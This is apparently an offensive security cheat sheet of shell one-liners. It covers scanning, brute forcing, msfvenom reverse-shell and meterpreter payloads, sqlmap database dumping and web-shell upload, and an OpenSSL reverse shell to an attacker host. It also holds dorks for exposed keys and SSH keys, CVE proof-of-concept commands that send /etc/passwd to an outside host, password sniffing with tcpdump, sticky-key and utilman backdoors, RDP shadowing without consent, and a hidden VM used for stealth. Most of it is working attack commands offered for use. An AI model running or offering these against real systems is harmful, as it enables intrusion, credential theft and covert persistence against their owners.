##-==================================-##
##    [+]  Impacket - SMBServer - :
##-==================================-##
impacket-smbserver share -smb2support /tmp/

copy \\192.168.1.13\share\nc.exe


## ------------------------------------------------------------------------------------- ##
##    [?]  If you get an error, use an account name and password:
## ------------------------------------------------------------------------------------- ##

impacket-smbserver share -smb2support /tmp/smbshare -user gajos -password gajos

net use g: \\192.168.1.13\share /user:test test



##-===========================-##
##    [+]  Onesixtyone - :
##-===========================-##
onesixtyone -c wordlist-common-snmp-community-strings.txt 172.31.2.181
 

##-======================-##
##    [+]  :
##-======================-##
snmpwalk -Os -c public -v 1 172.31.2.181



##-=============================-##
##    [+]  Masscan - 
##-=============================-##
masscan -p1-65535 $(dig +short $strip|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1) --max-rate 1000 |& tee $strip_scan



##-=========================================-##
##    [+]  Masscan - 
##-=========================================-##
masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out
masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000


##-=========================================-##
##    [+]  Masscan - find machines on the network
##-=========================================-##
masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp
cat masscan_machines.tmp | grep open | cut -d " " -f4 | sort -u > masscan_machines.lst


##-=========================================-##
##    [+]  Masscan - find open ports for a machine
##-=========================================-##
masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst


##-===========================================-##
##    [+]  TCP grab banners and services information
##-===========================================-##
TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)

[ "$TCP_PORTS" ] && sudo nmap -sT -sC -sV -v -Pn -n -T4 -p$TCP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_tcp $MACHINE_IP


##-===========================================-##
##    [+]  UDP grab banners and services information
##-===========================================-##
UDP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep udp | cut -d " " -f3 | tr '\n' ',' | head -c -1)


[ "$UDP_PORTS" ] && sudo nmap -sU -sC -sV -v -Pn -n -T4 -p$UDP_PORTS --reason --version-intensity=5 -oA $MACHINE_IP/scans/nmap_udp $MACHINE_IP


##-======================-##
##    [+]  :
##-======================-##
cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce


##-======================-##
##    [+]  :
##-======================-##
sniper -f ips.txt -m massweb -w output.txt


##-======================-##
##    [+]  :
##-======================-##
sniper -t <IP> -m webscan -w output.txt



##-====================================-##
##    [+]  MSFVenom - Generating Payloads:
##-====================================-##



##-=============================-##
##    [+]  PHP reverse shell payload :
##-=============================-##
msfvenom -p php/reverse_php LHOST=YOURIPADDRESS LPORT=443 > shell.php


##-=========================================================-##
##    [+]  Windows reverse shellcode for python script buffer overflow:
##-=========================================================-##
msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f c -e x86/alpha_mixed -b "\x00\x04\xcd\x77\x3f"



##-=======================================================-##
##    [+]  Windows bind shellcode - for python script buffer overflow:
##-=======================================================-##
msfvenom -p windows/shell_bind_tcp LPORT=444 -f c -e x86/shikata_ga_nai -b  "\x00\x04\xcd\x77\x3f"


##-===================================-##
##    [+]  Meterpreter exe with reverse shell:
##-===================================-##
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURIPADDRESS LPORT=4444 -f exe > meterpreter.exe
	

	##-======================-##
##    [+]  64-bit:
##-======================-##
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.120 LPORT=4444 -f exe > met64.exe


##-===============================-##
##    [+]  WAR file for Apache Tomcat:
##-===============================-##.
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIPADDRESS LPORT=443 -f war > shell.war


##-======================-##
##    [+]  :
##-======================-##
##  find malicious js file extract shell.war then browse to js file in browser
jar -xvf shell.war


##-======================-##
##    [+]  Windows MSI:
##-======================-##
msfvenom -f msi-nouac -p windows/adduser USER=hackerman PASS=password -o add_user.msi


##-=================-##
##    [+] Javascript :
##-=================-##
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -f js_le


##-====================-##
##    [+] Linux elf binary :
##-====================-##
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.121 LPORT=443 -b "\x00" -f elf -o filename


##-=====================================-##
##    [+]  Search ExploitDB for Apache 2.4.7:
##-=====================================-##
site:exploit-db.com apache 2.4.7


##-========================-##
##    [+] Remove dos-exploits :
##-========================-##
searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"


##-===============================================-##
##    [+]  Only search the title (exclude the path), add the -t:
##-===============================================-##
searchsploit -t Apache | grep -v '/dos/'





##-================================-##
##     [+] SQLMap - Easy mode:
##-================================-##
sqlmap --wizard


##-=====================================================-##
##     [+] SQLMap - Capture request with burp & save to request.txt:
##-=====================================================-##
## ------------------------------------------------------------------------------------- ##
##    [?]  you need to authenticate before 
##          you can access vulnerable parameter.
## ------------------------------------------------------------------------------------- ##
sqlmap -r request.txt


##-=========================================-##
##     [+] SQLMap - grab cookie out of burp/proxy
##                              insert into command line option:
##-=========================================-##  
sqlmap -u "http://$IP/index.php?id=1" --cookie "PHPSESSIONID=1234example"


##-================================-##
##     [+] SQLMap - Dump
##-================================-##
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql -D databasename -T tablename --dump


##-================================-##
##     [+] SQLMap - Crawl
##-================================-##
sqlmap -u http://$IP --dbms=mysql --crawl=3


##-================================-##
##     [+] SQLMap - List databases
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 --dbs


##-================================-##
##     [+] SQLMap - List tables
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name --tables


##-================================-##
##     [+] SQLMap - List columns
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --columns


##-================================-##
##     [+] SQLMap - Dump all
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 -D database_name -T table_name --dump-all


##-================================-##
##     [+] SQLMap - Set Cookie
##-================================-##
sqlmap -u http://$Domain/ovidentia/index.php\?tg\=delegat\&idx\=mem\&id\=1 --cookie "Cookie: OV1364928461=6kb5jvu7f6lg93qlo3vl9111f8" --random-agent --risk 3 --level 5 --dbms=mysql -p id --dbs


##-================================-##
##     [+] SQLMap - Checking Privileges
##-================================-##
sqlmap -u http://localhost/Less-1/?id=1 --privileges | grep FILE


##-================================-##
##     [+] SQLMap - Reading file
##-================================-##
sqlmap -u $URL --file-read=$File

sqlmap -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd


##-================================-##
##     [+] SQLMap - Writing file
##-================================-##
sqlmap -u $URL --file-write=$File --file-dest=$Path

sqlmap -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php



##-================================-##
##     [+] SQLMap - Post
##-================================-##
sqlmap -u $URL --data="<POST-paramters> "

sqlmap -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname


##-================================-##
##     [+] SQLMap - use a file for post request:
##-================================-##
sqlmap  -r post-request.txt -p uname


##-============================-##
##     [+] Findomain- SQL Injection:
##-============================-##
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1






##-===================================-##
##     [+] OpenSSL - Encrypted Reverse Shell
##-===================================-##


##-================================-##
##     [+] OpenSSL - Generate certificate:
##-================================-##
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes


##-========================-##
##     [+] OpenSSL - Listener:
##-========================-##
openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>


##-============================-##
##     [+] OpenSSL - Reverse Shell:
##-============================-##
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> > /tmp/s; rm /tmp/s


##-=====================================-##
##     [+] PSQL - search subdomain using cert.sh
##-========≈============================-##
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew'










https://t.me/incidentresponse
https://t.me/sudapodoshel/2
https://t.me/sudapodoshel/2721
https://t.me/RSTReportHub
https://t.me/LibraLair
https://t.me/avleonovnews
https://t.me/SqlDumps/104
http://t.me/combatosint
https://t.me/BoomSecOfficial
https://t.me/thewhiteh4t




#ShadowBrokers



##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap --host-file hosts.txt > smbmapresults.txt


##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/Documents/smbmap/hosts.txt > result.txt


##-================================-##
##     [+] SMBMap - 
##-================================-##
smbmap -u domainusername -p 'supersecretpassword' -d domain.local --host-file /home/<user>/mappashares/testdownload/test2.txt -R -A '.\.bat\b'







##-=============================-##
##     [+] GoogleDorks - Search for APIs
##-=============================-##
site:target.tld inurl:api
intitle:"index of" "api.yaml" site:target.tld
intitle:"index of" intext:"apikey.txt" site:target.tld
allintext:"API_SECRET*" ext:env | ext:yml site:target.tld



##-==============÷=-##
##    [+]  API Recon:
##-================-##

##  Developer API File:
openapi.json 


## ------------------------------------------- ##
##    [?] 
## ------------------------------------------- ## 
https://github.com/prisma-labs/get-graphql-schema


##-======================-##
##    [+]  API Dorks:
##-======================-##
site:target.tld intitle:api | developer
________________________________

##-======================-##
##    [+]  GDorks - Search for APIs:
##-======================-##
________________________________
site:target.tld inurl:api
________________________________
intitle:"index of" "api.yaml" 
________________________________
site:target.tld intitle:"index of" 
________________________________
intext:"apikey.txt" site:target.tld
________________________________
allintext:"API_SECRET*" 
________________________________
ext:env | ext:yml site:target.tld




##-=================================-##
##    [+]  Regex to search for sensitive info 
##-=================================-##
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp|GTM-" *.js





##-=============================-##
##     [+] GoogleDorks - SQL
##-=============================-##
"index of" "database.sql.zip" | filetype:sql intext:password
ext:sql | ext:dbf | ext:mdb
intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
site:target.com intitle:”index of” db_backup.sql | db.sql | database.sql | sql | .sql.gz | .sql.bz2


##-=============================-##
##     [+] GoogleDorks - WordPress
##-=============================-##
intitle:"Index of" wp-admin



##-=============================-##
##     [+] GoogleDorks - cgi-bin
##-=============================-##
inurl:/cgi-bin/
inurl:/cgi-bin/ + intext:”User ID” + intext:”Password”
inurl:/cgi-bin/login.cgi

Juicy files/Pages

intext:"budget approved") inurl:confidential


##-=============================-##
##     [+] GoogleDorks - Apache2
##-=============================-##
intitle:"Apache2 Ubuntu Default Page: It works"


##-=============================-##
##     [+] GoogleDorks - Zoom Videos
##-=============================-##
inurl:zoom.us/j AND intext:"scheduled for"


##-=============================-##
##     [+] GoogleDorks - SSH private keys
##-=============================-##
intitle:index.of id_rsa -id_rsa.pub
intitle:"Index of /" ".ssh"

##-=============================-##
##     [+] GoogleDorks - email list
##-=============================-##
filetype:xls inurl:"email.xls"

##-=============================-##
##     [+] GoogleDorks - ENV files
##-=============================-##
inurl:.env | filetype:.env | ext:env
filetype:env intext:DB_USERNAME


intitle:"index of"
inurl:"/private"
intitle:"index of" "local.json"
Fwd: intitle:"Index of /" intext:"resource/"
filetype:xls + password + inurl:.com
site:gov.* intitle:"index of" *.pptx
docs.google.com/spreadsheets
"microsoft internet information services" ext:log
inurl:src/viewcvs.cgi/log/.c?=
intitle:"welcome.to.squeezebox"
intitle:"index of" "mysql.properties"
inurl: /wp-content/uploads/ inurl:"robots.txt" "Disallow:" filetype:txt
inurl:"/horde/test.php"
filetype:gitattributes intext:CHANGELOG.md -site:github.com
ext:txt | ext:log | ext:cfg | ext:yml "administrator:500:"
intitle: index of "*db.tar.gz"
inurl:admin filetype:xlsx site:gov.*
Index of" intext:"source_code.zip
inurl:"htaccess|passwd|shadow|htusers"
“config.yml” | intitle:”index of” “config.yml”
intitle:"index of" "config.txt"
inurl:/wp-content/uploads/wpo_wcpdf
intext:"ArcGIS REST Services Directory" intitle:"Folder: /"
allintitle:"macOS Server" site:.edu
inurl:wp-content/uploads/sites
intitle:"index of" "private.properties"
intitle:"SCM Manager" intext:1.60
intitle:"index of" "profiler"
intitle:"index of" "main.yml"
intitle:"Index of" inurl:/backup/ "admin.zip"
intitle:"index of" google-maps-api
intitle:"index of" github-api
inurl:uploadimage.php
intitle: "index of" "/backup.sql"
intitle:"Sharing API Info"
inurl:user intitle:"Drupal" intext:"Log in" -"powered by"
inurl: /libraries/joomla/database/
"web.config" | inurl:/conf/ | "error_log"
intitle:"Index of /" + ".htaccess"
intitle:"index of /.git" "paren directory"
inurl:Makefile.toml


##-=============================-##
##     [+] GoogleDorks - Govermment docs
##-=============================-##
allintitle: restricted filetype:doc site:gov


##-=============================-##
##     [+] GoogleDorks - PDFs
##-=============================-##
intitle: index of pdf | ext:pdf | inurl:.pdf
filetype:pdf “Confidential” | “Secret” | “Classified”


##-========================-##
##     [+] ATScan - 
##-========================-##
atscan --dork "site:gov.il ext:txt|xlsx|csv" --motor google --level 5 


##-===========================================================-##
##     [+] httpx - Extract and Probe all the ips associated with same host
##-===========================================================-##
httpx -l /root/urls.txt -pa -o urls_ips.txt


##-========================-##
##     [+] Extract the IPS
##-========================-##
github.com/emadshanab/Ext…


##-========================-##
##     [+] httpx - Scan all ports
##-========================-##
httpx -l ips.txt -ports - -o ips_ports.txt

nuclei -l ips_ports.txt -t nuclei-templates


##-========================================================-##
##     [+] httpx - Extract Sensitive Informations on /auth.json Endpoint
##-========================================================-##
subfinder -d $Domain | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003


##-========================-##
##     [+] httpx - Time-based SQLi in sitemap.xml 
##-========================-##
cat urls | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


github.com/thecybertix/


##-========================-##
##     [+] One-liners & Quick Wins
##-========================-##


##-========================-##
##     [+] Grep emails and other PII Data from URLs file
##-========================-## 
grep -E -o '\\\\\\\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\\\\\.[a-zA-Z]{2,}\\\\\\\\b' urls.txt


##-========================-##
##     [+] Extract Endpoints from JavaScript
##-========================-##
cat FILE.js | grep -oh "\\\\\\\\"\\\\\\\\/[a-zA-Z0-9_/?=&]&\\\\\\\\""| sed -e 's/^"//' -e 's/"$//' | sort -u




##-========================-##
##     [+] katana - Collect JS Files
##-========================-##
katana -list targets.txt -jc | grep “\\.js$” | uniq | sort -u | tee JS.txt


##-========================-##
##     [+] use gau tool
##-========================-##
cat targets.txt | gau |  grep “\\.js$” | uniq | sort -u | tee JS2.txt


##-========================-##
##     [+] nuclei - Analyzing JS files
##-========================-##
nuclei -l JS.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt








##-========================-##
##     [+] Get CIDR & Org Information from Target Lists
##-========================-##
for HOST in $(cat HOSTS.txt); do echo (for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\\\\\\\\|Organization" | tr -s " | paste -; done | uniq); done


##-========================-##
##     [+] Prototype Pollution
##-========================-##
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\\\\\\\/?_proto_[testparam]=exploit\\\\\\\\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]" | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


##-========================-##
##     [+] Sitemap SQL Injection
##-========================-##
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'


##-========================-##
##     [+] Authentication Bypass (CVE-2022-40684) POC
##-========================-##
##   [?]  https://twitter.com/h4x0r_dz/status/1580648642750296064/photo/1>

ffuf -w "host_list.txt:URL" -u "<https://URL/api/v2/cmdb/system/admin/admin>" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r


##-========================-##
##     [+] CVE-2023-26256
##-========================-##

## ---------------------------------------------------------------------------------------------- ##
##   [?] https://github.com/aodsec/CVE-2023-26256
## ---------------------------------------------------------------------------------------------- ##

git clone https://github.com/aodsec/CVE-2023-26256.git

python3 CVE-2023-26256.py -h


##-===============================================================-##
##     [+] CVE-2023-38035 - UnAuthenticated - Remote Code Execution (RCE):
##-===============================================================-##

## ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
          python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd' 
## ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ## 

## ---------------------------------------------------------------- ##
##    [×]  BURP-COLLABORATOR-URL.com
##    [?]  (https://burp-collaborator-url.com/)
## ---------------------------------------------------------------- ##
##    'isRoot': True}, None)"
## --------------------------------------------------- ##

curl -X POST -d @/etc/passwd 


##-========================-##
##     [+] Quick Port Scanning with Fuzzing
##-========================-##
cat ips.txt|naabu -silent -tp 1000 -o top1k.txt;cat top1k.txt|grep -vE ':80|:443' | httpx -silent -fc 400,503,204,405 -o httpx.txt;cat httpx.txt|python3 dirsearch.py --stdin -e '*' -t 60 -w onelistforall.txt -i 200,301,302 --format plain -o $Rreport.txt


## ---------------------------------------------------------------------------------------------- ##
##     [?] SSRF use Autorize Exxtension Match and replace
## ---------------------------------------------------------------------------------------------- ##
https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)



##-===================================-##
##      [+] Nuclei - Waf Detection Template:
##-===================================-##
nuclei -l urls.txt -t nuclei_templates/waf


##-===================================-##
##     [+]  wafw00f - 
##-===================================-##
wafw00f -l urls.txt



##-========================-##
##     [+] 
##-========================-##
photon -u https://$Domain -l 3 -t 100 --wayback








##  Show DNS traffic

tcpdump -i <interface> -nn -l udp port 53

 
##  Show HTTP User-Agent & Hosts

tcpdump -i <interface> -nn -l -A -s1500 | egrep -i 'User-Agent:|Host:'


##   Show HTTP Requests & Hosts

tcpdump -i <interface> -nn -l -s 0 -v | egrep -i "POST /|GET /|Host:"


##  Show email recipients

tcpdump -i <interface> -nn -l port 25 | egrep -i 'MAIL FROM\|RCPT TO'


##  Show FTP data

tcpdump -i <interface> -nn -v port ftp or ftp-data


##  Show all passwords different protocols

tcpdump -i wlan0 port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '




## Virtual Machines

## ------------------------------------------------------------------------------------- ##
##    [?]  Based on the Shadow Bunny technique.
## ------------------------------------------------------------------------------------- ##

##-==============================-##
##     [+]  ps1 - 


##-=========================-##
##    [+]  Download Virtualbox
##-=========================-##
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe


perform a silent install
avoid creating desktop and quick launch icons

VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
Disabling notifications

VBoxManage.exe setextradata global GUI/SuppressMessages "all" 

##-=========================-##
##    [+]  Download the Virtual machine disk
##-=========================-##
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

##-=========================-##
##    [+]  Create a new VM
##-=========================-##
VMName = "IT Recovery"
VBoxManage.exe createvm --name $VMName --ostype "Ubuntu" --register

##-==================================-##
##    [+]  Add a network card in NAT mode:
##-==================================-##
VBoxManage.exe modifyvm $VMName --ioapic on                                         ## required for 64bit
VBoxManage.exe modifyvm $VMName --memory 1024 --vram 128
VBoxManage.exe modifyvm $VMName --nic1 nat
VBoxManage.exe modifyvm $VMName --audio none
VBoxManage.exe modifyvm $VMName --graphicscontroller vmsvga
VBoxManage.exe modifyvm $VMName --description "Shadowbunny"

##-===================================-##
##    [+]  VBoxManage - Mount the VHD file:
##-===================================-##
VBoxManage.exe storagectl $VMName -name "SATA Controller" -add sata
VBoxManage.exe storageattach $VMName -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0


##-==============================-##
##    [+]  VBoxManage - Start the VM
##-==============================-##
VBoxManage.exe startvm $VMName –type headless 


##-=================================-##
##    [+]
##-===================================-##

## ---------------------------------------------------------------------------------------- ##
##    [?]  VBoxManage -  Adding optional shared folder
## ---------------------------------------------------------------------------------------- ##
## 
## --------------------------------------------------------------------- ##
##    [?]  Require: VirtualBox Guest Additions
## --------------------------------------------------------------------- ##
VBoxManage.exe sharedfolder add VMName -name shadow_c -hostpath c:\ -automount


##-==============================-##
##     [+]  Mount the folder in the VM:
##-==============================-##
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c



##-=========================================================-##
##    [+]  DSQuery -Retrieves all ​IP​ address subnets 
##                             used in the internal network by the ​DHCP​ service
##-=========================================================-##
## 
## ---------------------------------------------------------------------------------------- ##
##    [?]  Typically running on the domain controller 2. 
## ---------------------------------------------------------------------------------------- ##
dsquery ​subnet​ -o rdn -limit 0 -u <domain suffix>\$User -p $Password



## ----------------------------------------------------------------------------------------------- ##
##    [+]  DSQuery - Retrieves the hostnames of 
##                              All Domain Controllers  from the domain 
## ----------------------------------------------------------------------------------------------- ##
## 
## ------------------------------------------------------------------------- ##
##    [?]  A querying system is connected to 3
## ------------------------------------------------------------------------- ##
dsquery server -o rdn -limit 0 -u <domain suffix>\$User -p $Password


##-===================================================-##
##    [+]  DSQuery - Retrieves the Hostnames of all the systems
##-===================================================-##
## ------------------------------------------------------------------------------------------------------ ##
##    [?]  Except the Domain Controllers from the domain 
##          That the querying system is connected.
## ------------------------------------------------------------------------------------------------------ ##
dsquery computer -o rdn -limit 0 -u <domain suffix> $User -p $Password



##-==============================-##
##    [+]  NLTest - List DNS  :
##-==============================-##
nltest /dclist:<dns suffix> 


##-================================================-##
##    [+]  NLTest - Test Domain Controllers - DomainTrusts
##-================================================-##
nltest /server:$DomainController/$DomainTrusts




##-=========================-##
##    [+]  RDP Backdoor - 
##-=========================-##

utilman.exe

## ------------------------------------------------------------------------------------- ##
##    [?]  At the login screen - press Windows Key+U, 
##    [?]  you get a cmd.exe window as SYSTEM.
## ------------------------------------------------------------------------------------- ##
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f


sethc.exe
 

## ------------------------------------------------------------------------------------------------------------------- ##
##    [?]  Hit F5 a bunch of times when you are at the RDP login screen.
## ------------------------------------------------------------------------------------------------------------------- ##


##-============================================-##
##     [+]  Reg - 
##-============================================-##
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f


##-=======================================-##
##     [+]  Remote Desktop Services Shadowing
##-=======================================-##


## ------------------------------------------------------------------------------------- ##
##    [?]  FreeRDP and rdesktop don't support the
##           Remote Desktop Services Shadowing feature.
## ------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------------------------- ##
##    [?]  Requirements: RDP must be running
## ------------------------------------------------------------------------------------- ##


##-============================================-##
##     [+]  Reg - View Session without user’s permission.
##-============================================-##
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4


##-==================================================-##
##     [+]  Reg - Allowing remote connections to this computer
##-==================================================-##
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


##-=================================-##
##     [+]  Reg - Disable UAC remote restriction
##-=================================-##
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f



##-==============================-##
##    [+] Mstsc -  :
##-==============================-##
mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt


## ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?]   /v parameter  ||  lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host
## ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?]   /shadow parameter   ||   used to specify the {SESSION_ID} value that is a shadowee’s session ID
## ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
## 
## ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ##
##    [?]   /noconsentprompt parameter   ||  allows to bypass a shadowee’s permission and shadow their session without their consent
## ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ##
## 
## -------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
##    [?]  /prompt parameter   ||   used to specify a user’s credentials to connect to a remote host.
## -------------------------------------------------------------------------------------------------------------------------------------------------------------- ##




##-===============================-##
##    [+]  Tunneling & Port Forwarding:
##    [+]     SSH over HTTP (Squid):
##-===============================-##


##-====================================-##
##     [+]  Socat - SSH over HTTP (Squid):
##-====================================-##
socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999


##-====================================-##
##     [+]  ProxyTunnel - SSH over HTTP (Squid)
##-====================================-##
proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555


##-====================================-##
##     [+]  ProxyChains - SSH over HTTP (Squid)
##-====================================-##
http 192.168.1.41 3128

proxychains ssh john@127.0.0.1


##-====================================-##
##     [+]  Corkscrew - SSH over HTTP (Squid)
##-====================================-##
ssh john@192.168.1.41 -t /bin/sh



##-======================-##
##    [+]  :
##-======================-##
ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null


##-======================-##
##    [+]  :
##-======================-##
gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 
 
##-======================-##
##    [+]  :
##-======================-##
amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json


##-======================-##
##    [+]  :
##-======================-##
cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains


##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null


##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list



##-======================-##
##    [+]  :
##-======================-##

if [ -f "$EC" ]; then
    cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
    
else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

fi



##-=========================-##
##    [+]  WEB PROBING AND SCREENSHOT
##-=========================-##
 naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt
    

##-======================-##
##    [+]  :
##-======================-##
cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt
    

##-======================-##
##    [+]  :
##-======================-##
